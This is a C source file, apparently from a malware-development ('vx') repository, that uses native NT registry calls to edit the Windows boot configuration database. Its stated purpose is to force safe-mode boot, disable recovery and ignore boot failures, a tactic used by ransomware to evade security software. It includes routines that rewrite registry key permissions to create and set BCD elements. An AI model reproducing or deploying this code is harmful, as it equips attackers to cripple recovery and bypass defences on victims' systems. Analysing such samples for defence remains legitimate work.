/**
* @file			bcdutil.c
* @author		Paul L. (@am0nsec)
* @version		1.0
* @brief        Modify boot configuration to enable safe mode, disable recovery and ignore all failure.
* @details
* @link			https://github.com/am0nsec/vx
* @copyright	This project has been released under the GNU Public License v3 license.
*/
#include "bcdutil.h"
#include <Ole2.h>
#include <aclapi.h>

_Use_decl_annotations_ NTSTATUS
BcdGetDefaultBootObject(
	_Out_ PHKEY  phWindowsBootMgrDefaultObj
) {
	// 1. Open handle to HKLM
	HKEY hLocalMachine = INVALID_HANDLE_VALUE;
	EXIT_ON_ERROR(BcdOpenKeyByName(
		L"\\Registry\\Machine",
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE | KEY_CREATE_SUB_KEY),
		NULL,
		&hLocalMachine
	));

	// 2. Find the BCD sub key
	HKEY hBCD = INVALID_HANDLE_VALUE;
	LPWSTR wszBcdSubKeyFragment = NULL;
	DWORD  dwzBcdSubKeyFragment = 0x00;
	EXIT_ON_ERROR(BcdpGetSubKeyByPattern(
		&hLocalMachine,
		L"BCD",
		(CONST DWORD)0x03,
		&wszBcdSubKeyFragment,
		&dwzBcdSubKeyFragment
	));

	// 3. Open handle to the new BCD sub key
	EXIT_ON_ERROR(BcdOpenKeyByName(
		wszBcdSubKeyFragment,
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		&hLocalMachine,
		&hBCD
	));
	HeapFree(GetProcessHeap(), 0x00, wszBcdSubKeyFragment);

	// 4. Open handle to the new Objects sub key
	HKEY hBCDObjects = INVALID_HANDLE_VALUE;
	EXIT_ON_ERROR(BcdOpenKeyByName(
		L"Objects",
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		&hBCD,
		&hBCDObjects
	));

	// 5. Open handle to the Windows boot manager
	HKEY hWindowsBootMgr = INVALID_HANDLE_VALUE;
	EXIT_ON_ERROR(BcdOpenKeyByName(
		GUID_WINDOWS_BOOTMGR,
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		&hBCDObjects,
		&hWindowsBootMgr
	));

	// 6. Open handle tot the Elements of the Windows boot manager
	HKEY hWindowsBootMgrElements = INVALID_HANDLE_VALUE;
	EXIT_ON_ERROR(BcdOpenKeyByName(
		BCD_ELEMENTS,
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		&hWindowsBootMgr,
		&hWindowsBootMgrElements
	));

	// 7. Open an handle to the default object and get the value.
	HKEY hWindowsBootMgrDefaultObj = INVALID_HANDLE_VALUE;
	EXIT_ON_ERROR(BcdOpenKeyByName(
		BCDE_BOOTMGR_TYPE_DEFAULT_OBJECT,
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		&hWindowsBootMgrElements,
		&hWindowsBootMgrDefaultObj
	));

	// 8. Open an handle to the default boot object
	LPWSTR wszWindowsBootMgrDefaultObj = NULL;
	DWORD  dwWindowsBootMgrDefaultObj = 0x00;
	EXIT_ON_ERROR(BcdpQueryValueByName(
		L"Element",
		&hWindowsBootMgrDefaultObj,
		REG_SZ,
		&wszWindowsBootMgrDefaultObj,
		&dwWindowsBootMgrDefaultObj
	));

	// 9. Get the GUID of the default object
	EXIT_ON_ERROR(BcdOpenKeyByName(
		wszWindowsBootMgrDefaultObj,
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		&hBCDObjects,
		phWindowsBootMgrDefaultObj
	));
	HeapFree(GetProcessHeap(), 0x00, wszWindowsBootMgrDefaultObj);

	// Cleanup and return
	NtClose(hLocalMachine);
	NtClose(hBCD);
	NtClose(hBCDObjects);
	NtClose(hWindowsBootMgr);
	NtClose(hWindowsBootMgrElements);
	NtClose(hWindowsBootMgrDefaultObj);
	return STATUS_SUCCESS;
}


_Use_decl_annotations_ NTSTATUS
BcdModifyBootConfiguration(
	_In_ CONST PHKEY  phKey,
	_In_ CONST LPWSTR wszKey,
	_In_ LPVOID       pData,
	_In_ ULONG        ulData
) {
	if (phKey == NULL || wszKey == NULL || pData == NULL || ulData == 0x00)
		return STATUS_UNSUCCESSFUL;

	// 1. Check if key already exist otherwise create a new one
	HKEY hObject = INVALID_HANDLE_VALUE;
	NTSTATUS Status = BcdOpenKeyByName(
		wszKey,
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		phKey,
		&hObject
	);
	if (Status == STATUS_OBJECT_NAME_NOT_FOUND) {
		// 1.1. Change the DACL to have write permissions
		RETURN_ON_ERROR(BcdpChangeObjectPermission(
			phKey,
			(KEY_CREATE_SUB_KEY | KEY_NOTIFY | KEY_ENUMERATE_SUB_KEYS | WRITE_DAC | KEY_QUERY_VALUE | READ_CONTROL)
		));

		// 1.2. Create the key
		RETURN_ON_ERROR(BcdpCreateKey(
			wszKey,
			(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE),
			phKey,
			&hObject
		));

		// 1.3. Revert the permissions
		RETURN_ON_ERROR(BcdpChangeObjectPermission(
			phKey,
			(KEY_NOTIFY | KEY_ENUMERATE_SUB_KEYS | WRITE_DAC | KEY_QUERY_VALUE | READ_CONTROL)
		));
	}

	// 2. Allow set Windows registry value to the newly created key and open new key
	RETURN_ON_ERROR(BcdpChangeObjectPermission(
		&hObject,
		KEY_SET_VALUE | KEY_NOTIFY | KEY_ENUMERATE_SUB_KEYS | WRITE_DAC | KEY_QUERY_VALUE | READ_CONTROL
	));

	NtClose(hObject);
	RETURN_ON_ERROR(BcdOpenKeyByName(
		wszKey,
		(KEY_SET_VALUE | READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		phKey,
		&hObject
	));

	// 3. Set the value and change the DACLs to original value
	RETURN_ON_ERROR(BcdpSetValue(
		BCD_ELEMENT,
		&hObject,
		pData,
		ulData
	));
	RETURN_ON_ERROR(BcdpChangeObjectPermission(
		&hObject,
		KEY_NOTIFY | KEY_ENUMERATE_SUB_KEYS | WRITE_DAC | KEY_QUERY_VALUE | READ_CONTROL
	));

	// Cleanup and return
	NtClose(hObject);
	return STATUS_SUCCESS;
}


_Use_decl_annotations_ NTSTATUS
BcdAcquireSyncMutant(
	_Out_ PHANDLE phHandle
) {
	if (phHandle == NULL)
		return STATUS_INVALID_PARAMETER;

	UNICODE_STRING MutantName = { 0x00 };
	RtlInitUnicodeString(&MutantName, L"\\KernelObjects\\BcdSyncMutant");

	OBJECT_ATTRIBUTES MutantAttributes = { 0x00 };
	InitializeObjectAttributes(
		&MutantAttributes,
		&MutantName,
		OBJ_CASE_INSENSITIVE,
		0x00,
		0x00
	);

	return NtOpenMutant(phHandle, 0x100000, &MutantAttributes, FALSE);
}


_Use_decl_annotations_ NTSTATUS
BcdpGetSubKeyByPattern(
	_In_  CONST PHKEY  phKey,
	_In_  CONST LPWSTR wszPattern,
	_In_  CONST DWORD  dwPatternLength,
	_Out_ LPWSTR* wszSubKeyName,
	_Out_ PDWORD       pdwSubKeyNameLength
) {
	if (phKey == NULL
		|| wszPattern == NULL
		|| pdwSubKeyNameLength == NULL)
		return STATUS_INVALID_PARAMETER;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	// Initialise variables and heap memory
	DWORD dwIndex = 0x00;
	ULONG ulBuffer = 0x100;
	PKEY_BASIC_INFORMATION BasicInformation = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBuffer);

	// Parse each entry one by one
	while (TRUE) {
		ULONG ulReturned = 0x00;
		Status = NtEnumerateKey(
			*phKey,
			dwIndex,
			KeyBasicInformation,
			(LPVOID)BasicInformation,
			ulBuffer,
			&ulReturned
		);

		// Key not found
		if (Status == STATUS_NO_MORE_ENTRIES) {
			Status = STATUS_UNSUCCESSFUL;
			break;
		}
		// Buffer not large enough to get the basic information
		else if (Status == STATUS_BUFFER_TOO_SMALL) {
			HeapReAlloc(GetProcessHeap(), 0x00, (LPVOID)BasicInformation, ulReturned);
			ulBuffer = ulReturned;
			continue;
		}

		// Checking if it is pattern
		if (_wcsnicmp(BasicInformation->Name, wszPattern, (SIZE_T)dwPatternLength) == 0x00) {
			*pdwSubKeyNameLength = BasicInformation->NameLength;
			*wszSubKeyName = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BasicInformation->NameLength);

			memcpy_s(
				*wszSubKeyName,
				BasicInformation->NameLength,
				BasicInformation->Name,
				BasicInformation->NameLength
			);
			Status = STATUS_SUCCESS;
			break;
		}

		// Try next entry
		RtlZeroMemory(BasicInformation, ulReturned);
		dwIndex++;
	}

	// Cleanup and exit
	HeapFree(GetProcessHeap(), 0x00, BasicInformation);
	return Status;
}


_Use_decl_annotations_ NTSTATUS
BcdOpenKeyByName(
	_In_  CONST LPWSTR wszKeyName,
	_In_  ACCESS_MASK  AccessMask,
	_In_  PHANDLE      phDirectory,
	_Out_ PHKEY        phKey
) {
	if (wszKeyName == NULL)
		return STATUS_INVALID_PARAMETER;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	// Initialise the UNCIODE_STRING
	UNICODE_STRING ObjectName = { 0x00 };
	RtlInitUnicodeString(&ObjectName, wszKeyName);

	// Initialise the OBJECT_ATTRIBUTES
	OBJECT_ATTRIBUTES ObjectAttributes = { 0x00 };
	InitializeObjectAttributes(
		&ObjectAttributes,
		&ObjectName,
		OBJ_CASE_INSENSITIVE,
		0x00,
		0x00
	);
	if (phDirectory != NULL)
		ObjectAttributes.RootDirectory = *phDirectory;

	// Try to open the key
	*phKey = INVALID_HANDLE_VALUE;
	Status = NtOpenKey(
		phKey,
		AccessMask,
		&ObjectAttributes
	);

	return Status;
}


_Use_decl_annotations_ NTSTATUS
BcdpQueryValueByName(
	_In_  CONST LPWSTR wszValueName,
	_In_  PHKEY        phKey,
	_In_  DWORD        dwType,
	_Out_ LPVOID* ppData,
	_Out_ DWORD* pdwData
) {
	if (wszValueName == NULL
		|| phKey == NULL
		|| ppData == NULL
		|| pdwData == NULL)
		return STATUS_INVALID_PARAMETER;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	// Initialise the UNCIODE_STRING
	UNICODE_STRING ObjectName = { 0x00 };
	RtlInitUnicodeString(&ObjectName, wszValueName);

	// Get buffer ready
	ULONG ulReturned = 0x00;
	ULONG ulBuffer = 0x100;
	PKEY_VALUE_PARTIAL_INFORMATION Information = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBuffer);

	// Get the value
	do {
		Status = NtQueryValueKey(
			*phKey,
			&ObjectName,
			KeyValuePartialInformation,
			(LPVOID)Information,
			ulBuffer,
			&ulReturned
		);

		if (NT_SUCCESS(Status))
			break;

		ulBuffer += 0x100;
		Information = HeapReAlloc(GetProcessHeap(), 0x00, Information, ulBuffer);
	} while (Status == STATUS_BUFFER_TOO_SMALL);

	// Check the data type
	if (Information->Type != dwType) {
		HeapFree(GetProcessHeap(), 0x00, Information);
		return STATUS_UNSUCCESSFUL;
	}

	// Allocate memory and copy data
	*ppData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Information->DataLength);
	memmove_s(*ppData, Information->DataLength, Information->Data, Information->DataLength);
	*pdwData = Information->DataLength;

	// De-allocate memory and return
	HeapFree(GetProcessHeap(), 0x00, Information);
	return Status;
}


_Use_decl_annotations_
NTSTATUS BcdpCreateKey(
	_In_  CONST LPWSTR wszKeyName,
	_In_  ACCESS_MASK  DesiredAccess,
	_In_  PHANDLE      phDirectory,
	_Out_ PHANDLE      phKey
) {
	if (wszKeyName == NULL || phKey == NULL)
		return STATUS_INVALID_PARAMETER;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	// Initialise the UNCIODE_STRING
	UNICODE_STRING ObjectName = { 0x00 };
	RtlInitUnicodeString(&ObjectName, wszKeyName);

	// Initialise the OBJECT_ATTRIBUTES
	OBJECT_ATTRIBUTES ObjectAttributes = { 0x00 };
	InitializeObjectAttributes(
		&ObjectAttributes,
		&ObjectName,
		OBJ_CASE_INSENSITIVE,
		0x00,
		0x00
	);
	if (phDirectory != NULL)
		ObjectAttributes.RootDirectory = *phDirectory;

	// Create the key
	return NtCreateKey(
		phKey,
		DesiredAccess,
		&ObjectAttributes,
		0x00,
		NULL,
		REG_OPTION_NON_VOLATILE,
		NULL
	);
}


_Use_decl_annotations_
NTSTATUS BcdpSetValue(
	_In_ CONST LPWSTR wszValue,
	_In_ PHANDLE      phKey,
	_In_ PVOID        pData,
	_In_ ULONG        ulData
) {
	if (wszValue == NULL || phKey == NULL || pData == NULL || ulData == 0x00)
		return STATUS_INVALID_PARAMETER;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	// Initialise the UNCIODE_STRING
	UNICODE_STRING ObjectName = { 0x00 };
	RtlInitUnicodeString(&ObjectName, wszValue);

	Status = NtSetValueKey(
		*phKey,
		&ObjectName,
		0x00,
		REG_BINARY,
		pData,
		ulData
	);
	return Status;
}


_Use_decl_annotations_
NTSTATUS BcdpChangeObjectPermission(
	_In_ CONST PHANDLE phKey,
	_In_ DWORD         dwPrivileges
) {
	if (phKey == NULL)
		return STATUS_UNSUCCESSFUL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	// Get the SID of the local Administrators group
	PSID AdminSID = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(
		&SIDAuthNT,
		0x02,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdminSID
	)) {
		return STATUS_UNSUCCESSFUL;
	}

	// Get the current security descriptor of the Windows Registry key
	PACL pOldDACL = NULL;
	PACL pNewDACL = NULL;
	PSECURITY_DESCRIPTOR SecurityDescriptor = NULL;
	DWORD dwStatus = GetSecurityInfo(
		*phKey,
		SE_REGISTRY_KEY,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL,
		&pOldDACL,
		NULL,
		&SecurityDescriptor
	);
	if (dwStatus != ERROR_SUCCESS)
		return STATUS_UNSUCCESSFUL;

	EXPLICIT_ACCESS ea = { 0x00 };
	ea.grfAccessPermissions = dwPrivileges;
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea.Trustee.ptstrName = (LPTSTR)AdminSID;

	if (SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL) != ERROR_SUCCESS)
		return STATUS_UNSUCCESSFUL;
	if (SetSecurityInfo(*phKey, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL) != ERROR_SUCCESS)
		return STATUS_UNSUCCESSFUL;
	return STATUS_SUCCESS;
}